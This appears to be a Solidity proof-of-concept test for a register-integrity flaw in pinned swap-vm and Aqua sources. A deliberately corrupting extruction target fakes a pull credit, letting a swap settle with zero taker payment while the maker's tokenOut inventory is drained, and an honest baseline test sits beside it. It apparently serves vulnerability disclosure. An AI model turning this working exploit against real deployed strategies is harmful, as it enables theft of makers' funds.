// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

/*
 * BEFORE arm — byte-exact pinned swap-vm v1.0.2 + aqua v1.0.0 sources (unpatched).
 *
 * Demonstrates the missing register-integrity invariant in Extruction._extruction:
 * a maker strategy delegating to an Extruction target that returns
 * amountNetPulled = amountIn (a pull credit that never happened) makes the pre-push
 * payment check at SwapVM.sol:239-241 pass vacuously, so the swap settles at ZERO
 * taker payment while the maker's real tokenOut inventory is pulled (Aqua.sol:63-70).
 *
 * THREAT-MODEL NOTE (honesty): the malicious target here is deployed by this test to
 * demonstrate what the protocol accepts from ANY extruction target. It models a
 * compromised, upgraded, or adversarial maker-deployed target. The live extruction
 * population measured read-only on 2026-10-17/18 was deterministic register
 * passthrough — this PoC demonstrates the gap the proposal closes, not a live incident.
 *
 * Executing this file is the approval-gated PoC step (see README.md).
 */

import { ISwapVM } from "../src/swapvm/interfaces/ISwapVM.sol";
import { MakerTraitsLib } from "../src/swapvm/libs/MakerTraits.sol";
import { TakerTraitsLib } from "../src/swapvm/libs/TakerTraits.sol";
import { SwapRegisters, SwapQuery } from "../src/swapvm/libs/VM.sol";
import { AquaSwapVMRouter } from "../src/swapvm/routers/AquaSwapVMRouter.sol";
import { Aqua } from "@1inch/aqua/src/Aqua.sol";

interface VmCheat {
    function prank(address) external;
}

/// @dev Minimal payment-capable ERC20 mock (SafeERC20-compatible return values).
contract MockERC20 {
    string public name;
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 v) external { balanceOf[to] += v; emit Transfer(address(0), to, v); }
    function approve(address s, uint256 v) external returns (bool) { allowance[msg.sender][s] = v; emit Approval(msg.sender, s, v); return true; }
    function transfer(address to, uint256 v) external returns (bool) { return _move(msg.sender, to, v); }
    function transferFrom(address f, address to, uint256 v) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) { require(a >= v, "ERC20: insufficient allowance"); allowance[f][msg.sender] = a - v; }
        return _move(f, to, v);
    }
    function _move(address f, address to, uint256 v) internal returns (bool) {
        require(balanceOf[f] >= v, "ERC20: insufficient balance");
        unchecked { balanceOf[f] -= v; balanceOf[to] += v; }
        emit Transfer(f, to, v);
        return true;
    }
}

/// @dev A deliberately corrupting extruction target: echoes the registers it received,
///      prices the swap, and credits amountNetPulled = amountIn. No value moves.
///      This is the exact abuse Fee.sol:259-263 documents for the register.
contract MaliciousExtructionTarget {
    uint256 public constant PRICED_AMOUNT_OUT = 1e18;
    function extruction(bool, uint256 nextPC, SwapQuery calldata, SwapRegisters calldata swap, bytes calldata, bytes calldata)
        external returns (uint256, uint256, SwapRegisters memory)
    {
        SwapRegisters memory r = swap;
        r.amountOut = PRICED_AMOUNT_OUT;
        r.amountNetPulled = swap.amountIn; // THE CORRUPTION: a pull credit that never happened
        return (nextPC, 0, r);
    }
}

/// @dev An honest extruction target: prices the swap, echoes all other registers unchanged.
contract HonestExtructionTarget {
    uint256 public constant PRICED_AMOUNT_OUT = 1e18;
    function extruction(bool, uint256 nextPC, SwapQuery calldata, SwapRegisters calldata swap, bytes calldata, bytes calldata)
        external returns (uint256, uint256, SwapRegisters memory)
    {
        SwapRegisters memory r = swap;
        r.amountOut = PRICED_AMOUNT_OUT;
        return (nextPC, 0, r);
    }
}

contract ExtructionRegisterIntegrityBefore {
    VmCheat constant VM = VmCheat(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address constant MAKER = address(0x1111);
    address constant TAKER = address(0x2222);
    uint256 constant X = 1e18;           // taker's declared amountIn
    uint256 constant Y = 1e18;           // amountOut priced by the targets
    uint256 constant DECLARED_IN = 5e18; // maker's declared tokenIn credit line
    uint256 constant DECLARED_OUT = 10e18;

    MockERC20 tokenIn;
    MockERC20 tokenOut;
    Aqua aqua;
    AquaSwapVMRouter router;
    MaliciousExtructionTarget maliciousTarget;
    HonestExtructionTarget honestTarget;
    ISwapVM.Order maliciousOrder;
    ISwapVM.Order honestOrder;
    bytes32 maliciousStrategyHash;
    bytes32 honestStrategyHash;

    // Mirror of SwapVM.Swapped for expectEmit (topic0 + data compare).
    event Swapped(bytes32 orderHash, address maker, address taker, address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut);
    event Proof(string what, uint256 value);

    function setUp() public {
        tokenIn = new MockERC20("Token In", "TIN");
        tokenOut = new MockERC20("Token Out", "TOUT");
        aqua = new Aqua();
        router = new AquaSwapVMRouter(address(aqua), address(0), address(this), "1inch SwapVM v1.0", "1.0.2");
        maliciousTarget = new MaliciousExtructionTarget();
        honestTarget = new HonestExtructionTarget();

        tokenOut.mint(MAKER, DECLARED_OUT);
        VM.prank(MAKER); tokenOut.approve(address(aqua), type(uint256).max);
        tokenIn.mint(TAKER, 100e18); // the taker CAN pay — and chooses not to
        VM.prank(TAKER); tokenIn.approve(address(router), type(uint256).max);
        VM.prank(TAKER); tokenIn.approve(address(aqua), type(uint256).max);

        maliciousOrder = _order(address(maliciousTarget));
        honestOrder = _order(address(honestTarget));
        maliciousStrategyHash = _ship(maliciousOrder);
        honestStrategyHash = _ship(honestOrder);
    }

    function _order(address target) internal pure returns (ISwapVM.Order memory) {
        // 33-byte extArgs, mirroring the live family's [config 5][ID 8][token 20] shape
        bytes memory extArgs = bytes.concat(bytes5(0), bytes8(0), abi.encodePacked(address(0)));
        // opcode 32 = Extruction (the pin's table, reachable byte mapping), argsLength = 53 = 20 + 33
        bytes memory program = bytes.concat(bytes1(uint8(32)), bytes1(uint8(53)), abi.encodePacked(target), extArgs);
        return MakerTraitsLib.build(MakerTraitsLib.Args({
            maker: MAKER,
            receiver: address(0),
            shouldUnwrapWeth: false,
            useAquaInsteadOfSignature: true,
            allowZeroAmountIn: false,
            hasPreTransferInHook: false,
            hasPostTransferInHook: false,
            hasPreTransferOutHook: false,
            hasPostTransferOutHook: false,
            preTransferInTarget: address(0), preTransferInData: "",
            postTransferInTarget: address(0), postTransferInData: "",
            preTransferOutTarget: address(0), preTransferOutData: "",
            postTransferOutTarget: address(0), postTransferOutData: "",
            program: program
        }));
    }

    function _ship(ISwapVM.Order memory order) internal returns (bytes32) {
        bytes memory strategy = abi.encode(order); // the 0x20-wrapped canonical strategy encoding
        address[] memory tokens = new address[](2);
        tokens[0] = address(tokenIn); tokens[1] = address(tokenOut);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = DECLARED_IN; amounts[1] = DECLARED_OUT;
        VM.prank(MAKER);
        return aqua.ship(address(router), strategy, tokens, amounts);
    }

    function _takerPacked(bool usePush) internal pure returns (bytes memory) {
        return TakerTraitsLib.build(TakerTraitsLib.Args({
            taker: TAKER,
            isExactIn: true,
            shouldUnwrapWeth: false,
            isStrictThresholdAmount: false,
            isFirstTransferFromTaker: true,
            useTransferFromAndAquaPush: usePush, // false = branch b, the pre-push-check branch
            threshold: "",
            to: address(0),
            deadline: 0,
            hasPreTransferInCallback: false,
            hasPreTransferOutCallback: false,
            preTransferInHookData: "", postTransferInHookData: "",
            preTransferOutHookData: "", postTransferOutHookData: "",
            preTransferInCallbackData: "", preTransferOutCallbackData: "",
            instructionsArgs: "",
            signature: ""
        }));
    }

    /// @notice BEFORE: the zero-payment extraction. The taker pays nothing, the maker's
    ///         real tokenOut is pulled. Every leg asserted on real balances.
    function test_1_beforePatch_zeroPaymentExtraction() public {
        uint256 takerTokenInBefore = tokenIn.balanceOf(TAKER);
        uint256 takerTokenOutBefore = tokenOut.balanceOf(TAKER);
        uint256 makerTokenOutBefore = tokenOut.balanceOf(MAKER);
        uint256 makerTokenInBefore = tokenIn.balanceOf(MAKER);
        (uint248 declaredInBefore, ) = aqua.rawBalances(MAKER, address(router), maliciousStrategyHash, address(tokenIn));
        (uint248 declaredOutBefore, ) = aqua.rawBalances(MAKER, address(router), maliciousStrategyHash, address(tokenOut));

        VM.prank(TAKER);
        (uint256 amountIn, uint256 amountOut, bytes32 orderHash) =
            router.swap(maliciousOrder, address(tokenIn), address(tokenOut), X, _takerPacked(false));

        require(orderHash == maliciousStrategyHash, "orderHash mismatch");
        require(amountIn == X, "amountIn mismatch");
        require(amountOut == Y, "amountOut mismatch");
        // THE PROOF: the taker paid nothing and received the maker's real inventory.
        require(tokenIn.balanceOf(TAKER) == takerTokenInBefore, "FAIL: taker tokenIn changed (a payment happened)");
        require(tokenOut.balanceOf(TAKER) - takerTokenOutBefore == Y, "FAIL: taker did not receive output");
        require(makerTokenOutBefore - tokenOut.balanceOf(MAKER) == Y, "FAIL: maker's wallet was not drained");
        require(tokenIn.balanceOf(MAKER) == makerTokenInBefore, "FAIL: maker received tokenIn (unexpected)");
        (uint248 declaredInAfter, ) = aqua.rawBalances(MAKER, address(router), maliciousStrategyHash, address(tokenIn));
        require(uint256(declaredInAfter) == uint256(declaredInBefore), "FAIL: maker's tokenIn credit line changed");
        (uint248 declaredOutAfter, ) = aqua.rawBalances(MAKER, address(router), maliciousStrategyHash, address(tokenOut));
        require(uint256(declaredOutBefore) - uint256(declaredOutAfter) == Y, "FAIL: ledger debit mismatch");
        emit Proof("BEFORE: taker paid 0 wei tokenIn; maker lost 1e18 tokenOut", Y);
    }

    /// @notice Baseline: an honest target + the standard push payment path settles normally
    ///         (equivalence arm — the proposed invariant must not change this).
    function test_2_beforePatch_honestSwap_branchA() public {
        uint256 takerTokenInBefore = tokenIn.balanceOf(TAKER);
        uint256 takerTokenOutBefore = tokenOut.balanceOf(TAKER);
        uint256 makerTokenOutBefore = tokenOut.balanceOf(MAKER);

        VM.prank(TAKER);
        router.swap(honestOrder, address(tokenIn), address(tokenOut), X, _takerPacked(true));

        require(takerTokenInBefore - tokenIn.balanceOf(TAKER) == X, "FAIL: taker did not pay");
        require(tokenOut.balanceOf(TAKER) - takerTokenOutBefore == Y, "FAIL: taker did not receive output");
        require(makerTokenOutBefore - tokenOut.balanceOf(MAKER) == Y, "FAIL: maker wallet mismatch");
        require(tokenIn.balanceOf(MAKER) == X, "FAIL: maker did not receive tokenIn");
        emit Proof("BEFORE: honest branch-a swap settles normally", X);
    }
}
